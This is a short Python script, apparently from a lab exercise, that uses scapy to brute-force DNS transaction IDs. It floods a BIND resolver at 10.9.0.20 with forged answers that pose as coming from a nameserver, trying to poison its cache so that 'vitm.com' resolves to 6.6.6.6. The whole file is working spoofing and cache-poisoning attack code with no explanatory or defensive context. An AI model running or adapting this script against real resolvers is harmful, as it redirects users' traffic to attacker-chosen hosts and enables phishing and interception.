from scapy.all import *
import random
import time

# Configuration
victim_ip = "10.9.0.20"         # BIND resolver IP (victim)
spoofed_ns_ip = "1.2.3.4"       # Fake authoritative nameserver IP (spoofed)
open_port = 49565               # Source port you discovered earlier
domain = "vitm.com"             # Target domain
fake_ip = "6.6.6.6"             # Fake A record IP

print("[*] Starting TXID brute-force for TuDoor DNSDoS...")

for txid in range(0, 65536):
    dns_resp = (
        IP(src=spoofed_ns_ip, dst=victim_ip) /
        UDP(sport=53, dport=open_port) /
        DNS(
            id=txid,
            qr=1, aa=1, rd=1, ra=1,
            qd=DNSQR(qname=domain, qtype='A'),
            an=DNSRR(rrname=domain, ttl=300, rdata=fake_ip)
        )
    )
    send(dns_resp, verbose=0)
    if txid % 1000 == 0:
        print("[*] Sent up to TXID {}".format(txid))


